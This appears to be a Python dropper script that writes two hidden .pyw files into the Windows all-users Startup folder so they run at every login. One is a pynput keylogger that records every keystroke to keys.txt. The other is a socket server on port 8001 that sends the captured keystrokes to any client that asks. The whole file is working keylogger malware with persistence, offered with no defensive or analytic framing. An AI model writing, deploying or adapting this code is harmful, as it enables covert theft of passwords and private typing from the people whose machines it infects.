f = open("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\log.pyw", "w")

f.write("from pynput import keyboard\n"
        "\n"
        "\n"
        "class KeyLogger():\n"
        "    def __init__(self, filename: str = \"keys.txt\") -> None:\n"
        "        self.filename = filename"
        "\n"
        "    @staticmethod\n"
        "    def get_char(key):\n"
        "        try:\n"
        "            return key.char\n"
        "        except AttributeError:\n"
        "            return str(key)\n"
        "\n"
        "    def on_press(self, key):\n"
        "        print(key)\n"
        "        with open(self.filename, 'a') as logs:\n"
        "            logs.write(self.get_char(key))\n"
        "            logs.close()\n"
        "\n"
        "    def main(self):\n"
        "        listener = keyboard.Listener( \n"
        "            on_press=self.on_press,\n"
        "        )\n"
        "        listener.start()\n"
        "\n"
        "if True:\n"
        "    logger = KeyLogger()\n"
        "    logger.main()\n"
        "    input()\n"
        )
f.close()

f = open("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\sock.pyw", "w")
f.write("import socket\n"
        "import sys\n"
        "\n"
        "sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "\n"
        "PORT = 8001\n"
        "HOST = \'localhost\'\n"
        "\n"
        "sockfd.bind((HOST, PORT))\n"
        "sockfd.listen(5)\n"
        "(clientsocket, address) = sockfd.accept()\n"
        "\n"
        "\n"
        "while True:\n"
        "    with open('keys.txt', 'r') as file:\n"
        "        data = file.read()\n"
        "    file.close()\n"
        "\n"
        "    message = clientsocket.recv(1024)\n"
        "    if message.decode('utf-8') == \"l\":\n"
        "        reply = \'Server output: \' + data\n"
        "    else:\n"
        "        reply = \'Server output fout: \' + message.decode(\'utf-8\')\n"
        "\n"
        "    if not message:\n"
        "        break\n"
        "\n"
        "    clientsocket.sendall(str.encode(reply))\n"
        "\n"
        "clientsocket.close()\n")
